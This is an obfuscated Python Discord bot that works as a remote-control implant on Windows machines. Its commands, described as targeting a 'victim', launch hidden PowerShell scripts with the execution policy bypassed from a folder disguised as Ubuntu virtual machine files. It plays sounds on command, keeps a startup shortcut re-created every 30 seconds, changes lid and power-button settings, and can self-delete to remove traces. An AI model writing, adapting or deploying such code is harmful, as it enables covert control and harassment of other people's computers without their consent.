k='all'
j='-SoundName'
i='.WAV'
Z='%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\reinstate.ps1'
U='Reinstated parameter successfully.'
T='\\'
S='%USERPROFILE%'
Q='-File'
P='Hidden'
O='-WindowStyle'
N='Bypass'
M='-ExecutionPolicy'
L='powershell.exe'
K=None
G=Exception
E=True
from datetime import datetime as W,timedelta as l
from discord.ext import commands as m
import subprocess as C,traceback as n,tempfile,threading as a,asyncio as H,discord as V,aiohttp as o,shutil,base64 as p,time as R,sys as X,os as A
b=V.Intents.default()
b.message_content=E
D=m.Bot(command_prefix='!',intents=b)
Y='TVRFM056ZzNOalkwTnpRMU5EY3lNREEwTVEuR050T1pSLjRYclZMMzRmdmx2VW04WXk1ZXNNZXFTek9YZThyZFQxZXFVSEpj'
Y=p.b64decode(Y).decode()
F=E
I=K
J=134217728
c='V6.5'
q=20
def d(interval=q):C=interval;A=W.now();D=A.hour*3600+A.minute*60+A.second;E=D%C;F=C-E;B=A+l(seconds=F);B=B.replace(microsecond=0);return B

@D.command(name='start',help='Play big sound')
async def z(ctx,sound_name='piano'):
	S=sound_name;D=ctx;global F
	if not F:return
	await D.send(f"Receive start command");S=S+i;e();R.sleep(2);T=d();U=(T-W.now()).total_seconds();await D.send(f"Waiting until {T}");R.sleep(U);V=H.get_running_loop()
	def X():
		global I;H=A.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\ubuntu24.ps1')
		try:
			I=C.Popen([L,M,N,O,P,Q,H,j,S],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);R,D=I.communicate(timeout=10)
			if D:
				with open(A.path.expandvars('%TEMP%\\ps1_error_log.txt'),'w')as K:K.write(D)
				return f"Error occurred:\n{D}"
			return'No error'
		except G as F:return f"Exception while launching: {F}"
	Y=await V.run_in_executor(K,X);await D.send(Y)
@D.command(name='stop',help='Stop big sound')
async def A0(ctx):
	global I
	if I and I.poll()is K:I.terminate();I.wait();await ctx.send('Process has been stopped.')
	else:await ctx.send('No process is currently running.')
@D.command(name='info',help='Know who is running')
async def A1(ctx):global F;D=A.path.expandvars(S);C=D.split(T)[-1];await ctx.send(f"{C} running {c}"if F else f"{C} not running {c}")
@D.command(name='sound',help='Play small sound')
async def A2(ctx,sound_name='win'):
	I=sound_name;D=ctx;global F
	if not F:return
	await D.send(f"Received sound command");I=I+i;e();R.sleep(2);S=d();T=(S-W.now()).total_seconds();await D.send(f"Waiting until {S}");R.sleep(T);U=H.get_running_loop()
	def V():
		F=A.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\ubuntu25.ps1')
		try:C.Popen([L,M,N,O,P,Q,F,j,I],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return'Launched successfully.'
		except G as D:return f"Exception while launching: {D}"
	X=await U.run_in_executor(K,V);await D.send(X)
@D.command(name='deactivate',help='Untarget a victim')
async def A3(ctx,name):
	G=False;D=ctx;C=name;global F;H=A.path.expandvars(S);E=H.split(T)[-1]
	if C==E:await D.send(f"Deactivated {E}");F=G
	elif C==k:await D.send(f"Deactivated for all");F=G
	else:await D.send(f"No name found for {C}")
@D.command(name='activate',help='Target a victim')
async def A4(ctx,name):
	D=ctx;C=name;global F;H=A.path.expandvars(S);G=H.split(T)[-1]
	if C==G:await D.send(f"Reactivated {G}");F=E
	elif C==k:await D.send(f"Reactivated for all");F=E
	else:await D.send(f"No name found for {C}")
@D.command(name='quit',help='Stop script')
async def quit(ctx,name):
	C=name;E=A.path.expandvars(S);D=E.split(T)[-1];
	if C==D:await ctx.send(f"Quitting {C}");X.exit(0)
	else:await ctx.send(f"Did not find name for {C}")
async def r(error_msg):
	A=D.get_channel(DISCORD_CHANNEL_ID)
	if A:await A.send(f"❌ Self-delete failed:\n```\n{error_msg}\n```")
	else:...
def s():
	try:
		H=A.path.abspath(X.argv[0]);B=A.path.dirname(H);I=A.path.dirname(B);F=A.path.join(I,'delete_folder.bat')
		with open(F,'w')as J:J.write(f'''@echo off
:loop
tasklist | findstr /I /C:"{A.path.basename(X.executable)}" >nul
if not errorlevel 1 (
    timeout /T 1 >nul
    goto loop
)
rmdir /S /Q "{B}"
del "%~f0"
''')
		C.Popen([F],shell=E)
	except G as L:K=n.format_exc();D.loop.create_task(r(K))
def t():
	D=H.get_running_loop()
	def F():
		F=A.path.expandvars(Z)
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return U
		except G as D:return f"Exception while reinstating: {D}"
	D.run_in_executor(K,F)
def e():
	D=H.get_running_loop()
	def F():
		F=A.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\resound.ps1')
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return U
		except G as D:return f"Exception while reinstating: {D}"
	D.run_in_executor(K,F)
@D.command(name='reinstate',help='Lid / powerbutton to default')
async def A5(ctx,name):
	D=A.path.expandvars(S);F=D.split(T)[-1]
	if not name==F:return
	I=H.get_running_loop()
	def R():
		F=A.path.expandvars(Z)
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return U
		except G as D:return f"Exception while reinstating: {D}"
	V=await I.run_in_executor(K,R);await ctx.send(V)
def u():
	F=A.path.expandvars(Z)
	try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return U
	except G as D:return f"Exception while reinstating: {D}"
def f():
	def D():
		F=A.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\shortcutmaker.ps1')
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return U
		except G as D:return f"Exception while reinstating: {D}"
	D();
def v():
	C='StartupSystem';E=A.path.join(A.getenv('APPDATA'),'Microsoft\\Windows\\Start Menu\\Programs\\Startup');D=A.path.join(E,C+'.lnk')
	if A.path.exists(D):A.remove(D);
	else:...
@D.command(name='selfdestruct',help='Delete the script from the machine')
async def A6(ctx,name):
	B=ctx;C=A.path.expandvars(S);E=C.split(T)[-1]
	if not name==E:return
	v();await B.send('Shortcut deleted successfully');t();await B.send('Reinstated successfully');await B.send('🧨 Self-destruct sequence initiated...');R.sleep(2);s();await B.send('💥 If all goes well, I will now disappear...');await D.close()
def w():
	while E:f();R.sleep(30)
def x():
	async def A():
		while E:
			try:await D.start(Y)
			except(V.ConnectionClosed,V.GatewayNotFound,V.HTTPException,o.ClientConnectorError)as A:await H.sleep(10)
			except G as A:await H.sleep(10)
	H.run(A())
f()
u()
g=a.Thread(target=w)
h=a.Thread(target=x)
g.start()
h.start()
g.join()
h.join()